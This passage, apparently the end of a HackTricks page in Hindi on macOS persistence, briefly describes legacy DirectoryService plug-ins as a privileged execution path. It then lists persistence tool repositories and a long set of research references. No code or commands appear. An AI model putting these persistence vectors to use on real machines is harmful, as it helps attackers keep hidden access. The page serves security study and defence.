`dspluginhelperd` legacy DirectoryService plug-in bundles को support करता है। जहाँ legacy plug-in स्वीकार और activate किया जाता है, वहाँ malicious plug-in privileged execution path बन सकता है; यह PAM और Authorization Plugins से अलग है। Directory का मौजूद होना यह साबित नहीं करता कि नया लिखा गया plug-in अगले boot पर चलेगा। macOS 26.5 पर Apple के स्थानीय `dspluginhelperd(8)` और `opendirectoryd(8)` manuals अब भी helper और इस legacy path को सूचीबद्ध करते हैं।<sup>[[53]](#references)</sup>

macOS 26 पर केवल-पढ़ने योग्य निरीक्षण: `/Library/DirectoryServices/PlugIns` और `/usr/libexec/dspluginhelperd` मौजूद हैं। इस परीक्षण के दौरान कोई plug-in install, configure या load नहीं किया गया।

## Persistence techniques और tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, Infostealer का वर्ष](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [अच्छे पुराने LaunchAgents से आगे - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [अच्छे पुराने LaunchAgents से आगे - 18 - X11 और XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [अच्छे पुराने LaunchAgents से आगे - 21 - दोबारा खोले गए Applications](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [अच्छे पुराने LaunchAgents से आगे - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [अच्छे पुराने LaunchAgents से आगे - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [अच्छे पुराने LaunchAgents से आगे - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [अच्छे पुराने LaunchAgents से आगे - 22 - LoginHook और LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [अच्छे पुराने LaunchAgents से आगे - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [अच्छे पुराने LaunchAgents से आगे - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [अच्छे पुराने LaunchAgents से आगे - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [अच्छे पुराने LaunchAgents से आगे - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [अच्छे पुराने LaunchAgents से आगे - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [अच्छे पुराने LaunchAgents से आगे - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [अच्छे पुराने LaunchAgents से आगे - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [अच्छे पुराने LaunchAgents से आगे - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [macOS पर persistence के लिए Folder Actions (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [अच्छे पुराने LaunchAgents से आगे - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [अच्छे पुराने LaunchAgents से आगे - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [अच्छे पुराने LaunchAgents से आगे - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] ["Mac File Opener" persistence का विश्लेषण (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [अच्छे पुराने LaunchAgents से आगे - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [अपनी पहुँच बनाए रखना: macOS persistence के लिए Screensavers (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [अच्छे पुराने LaunchAgents से आगे - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [अच्छे पुराने LaunchAgents से आगे - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [अच्छे पुराने LaunchAgents से आगे - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [अच्छे पुराने LaunchAgents से आगे - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [अच्छे पुराने LaunchAgents से आगे - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Authorization Plugins के ज़रिए persistent credential theft (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [अच्छे पुराने LaunchAgents से आगे - 30 - man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [अच्छे पुराने LaunchAgents से आगे - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [अच्छे पुराने LaunchAgents से आगे - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [अच्छे पुराने LaunchAgents से आगे - 23 - emond, Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [अच्छे पुराने LaunchAgents से आगे - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [अच्छे पुराने LaunchAgents से आगे - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [अच्छे पुराने LaunchAgents से आगे - 10 - Application script files](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [अच्छे पुराने LaunchAgents से आगे - 32 - Dock Tile Plugins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [अच्छे पुराने LaunchAgents से आगे - 33 - Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [अच्छे पुराने LaunchAgents से आगे - 34 - launchd boot tasks](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [अच्छे पुराने LaunchAgents से आगे - 35 - NVRAM के ज़रिए persistence (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [OS X पर persistence के लिए email का उपयोग (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [संदिग्ध Apple Mail Rule Plist Modification (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Malicious Profiles - Macs के लिए सबसे गंभीर खतरों में से एक (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 - Ch.0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [CVE-2024-44243 का विश्लेषण: kernel extensions के ज़रिए macOS SIP bypass (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [Claude Code Project Files के ज़रिए RCE और API Token Exfiltration (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [GitHub Copilot और Cursor में नई Vulnerability - Rules File Backdoor (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome - वैकल्पिक installation methods (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [Mac पर Chrome में ExtensionInstallForcelist हटाएँ (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo Plugins लिखने पर (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Custom URL Schemes के ज़रिए Remote Mac Exploitation (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Plugins का दुरुपयोग करके macOS persistence की दो तरकीबें (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO DAL का न्यूनतम उदाहरण (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Spotlight-आधारित macOS TCC vulnerability का विश्लेषण (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Python `site` module का documentation (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
{{#include ../banners/hacktricks-training.md}}
